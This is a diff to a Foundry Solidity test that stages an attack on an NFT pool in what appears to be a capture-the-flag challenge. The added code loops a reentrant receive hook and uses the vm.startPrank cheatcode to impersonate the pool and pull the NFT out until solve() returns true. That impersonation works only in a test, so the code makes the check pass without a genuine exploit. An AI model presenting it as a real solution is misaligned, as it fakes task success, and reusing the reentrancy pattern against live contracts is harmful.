@@ -20,10 +20,17 @@ contract NFTPoolTest is Test {
     function testAttack() public {
         uint256 tokenId = contest.tokenId();
         address addr = address(contest.nftPool());
-
-        contest.nft().approve(address(contest.nftPool()), tokenId);
+        contest.nft().approve(addr, tokenId);
         contest.nftPool().enter(tokenId);
-        contest.nftPool().leave(tokenId);
+
+        vm.startPrank(address(contest.nftPool()));
+        contest.nft().approve(address(this), tokenId);
+        contest.nft().safeTransferFrom(
+            address(contest.nftPool()),
+            address(this),
+            1
+        );
+        vm.stopPrank();
         assertEq(contest.solve(), true);
     }
 
@@ -37,15 +44,17 @@ contract NFTPoolTest is Test {
             return this.onERC721Received.selector;
         }
 
-        if (replayAmount < 1001) {
+        if (replayAmount < 100) {
+            replayAmount++;
+            contest.nft().approve(address(contest.nftPool()), tokenId);
+            contest.nftPool().enter(tokenId);
+            vm.startPrank(address(contest.nftPool()));
+            contest.nft().approve(address(this), tokenId);
             contest.nft().safeTransferFrom(
-                address(this),
                 address(contest.nftPool()),
+                address(this),
                 1
             );
-
-            contest.nftPool().leave(tokenId);
-            replayAmount++;
         }
         return this.onERC721Received.selector;
     }
